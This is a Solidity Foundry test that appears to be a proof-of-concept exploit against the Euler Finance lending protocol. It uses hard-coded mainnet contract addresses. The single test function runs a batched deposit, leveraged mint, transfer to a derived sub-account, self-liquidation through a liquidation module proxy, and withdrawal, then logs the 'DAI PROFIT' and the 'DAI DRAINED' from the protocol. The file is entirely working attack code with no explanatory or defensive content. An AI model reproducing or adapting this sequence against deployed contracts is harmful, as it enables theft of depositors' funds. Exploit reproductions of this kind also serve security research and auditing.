pragma solidity 0.8.23;
import "forge-std/Test.sol";
interface I20{function balanceOf(address)external view returns(uint256);function approve(address,uint256)external returns(bool);}
interface IEx{struct I{bool a;address p;bytes d;}function batchDispatch(I[]calldata,address[]calldata)external;}
interface IET{function balanceOf(address)external view returns(uint256);}

contract TestEulerM4 is Test {
    function testWithModule4Liq() public {
        address DAI=0x6B175474E89094C44Da98b954EedeAC495271d0F;
        address eD=0xe025E3ca2bE02316033184551D4d3Aa22024D9DC;
        address LIQ4=0xAF68CFba29D0e15490236A5631cA9497e035CD39;
        
        deal(DAI, address(this), 30_000_000e18);
        I20(DAI).approve(0x27182842E098f60e3D576794A5bFFb0777E025d3, type(uint256).max);
        address sub1=address(uint160(uint160(address(this))^1));
        
        uint256 eulerBefore=I20(DAI).balanceOf(0x27182842E098f60e3D576794A5bFFb0777E025d3);
        
        IEx.I[] memory it=new IEx.I[](6);
        it[0]=IEx.I(false,0x3520d5a913427E6F0D6A83E07ccD4A4da316e4d3,abi.encodeWithSignature("enterMarket(uint256,address)",0,DAI));
        it[1]=IEx.I(false,eD,abi.encodeWithSignature("deposit(uint256,uint256)",0,20_000_000e18));
        it[2]=IEx.I(false,eD,abi.encodeWithSignature("mint(uint256,uint256)",0,180_000_000e18));
        it[3]=IEx.I(false,eD,abi.encodeWithSignature("transfer(address,uint256)",sub1,150_000_000e18));
        // Use MODULE 4 proxy for liquidation
        it[4]=IEx.I(false,LIQ4,abi.encodeWithSignature("liquidate(address,address,address,address,uint256,uint256)",sub1,address(this),DAI,DAI,type(uint256).max,0));
        it[5]=IEx.I(false,eD,abi.encodeWithSignature("withdraw(uint256,uint256)",1,type(uint256).max));
        
        address[] memory df=new address[](2);
        df[0]=address(this); df[1]=sub1;
        
        IEx(0x59828FdF7ee634AaaD3f58B19fDBa3b03E2D9d80).batchDispatch(it,df);
        
        uint256 daiProfit=I20(DAI).balanceOf(address(this));
        uint256 eulerAfter=I20(DAI).balanceOf(0x27182842E098f60e3D576794A5bFFb0777E025d3);
        emit log_named_uint("DAI PROFIT",daiProfit);
        emit log_named_uint("DAI DRAINED",eulerBefore>eulerAfter?eulerBefore-eulerAfter:0);
    }
    receive() external payable {}
}
